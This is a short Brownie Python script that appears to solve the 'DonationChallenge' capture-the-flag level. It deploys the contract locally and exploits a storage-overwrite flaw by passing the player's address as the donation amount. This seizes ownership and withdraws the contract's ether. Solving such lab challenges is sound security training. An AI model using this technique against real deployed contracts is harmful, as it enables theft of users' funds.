from brownie import DonationChallenge, accounts


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = DonationChallenge.deploy({'from': deployer, 'value': '1 ether'})

    contract.donate(int(player.address, 16), {
                    'from': player, 'value': int(player.address, 16) // 10**36})
    assert contract.owner() == player
    contract.withdraw({'from': player})

    assert contract.isComplete() == True
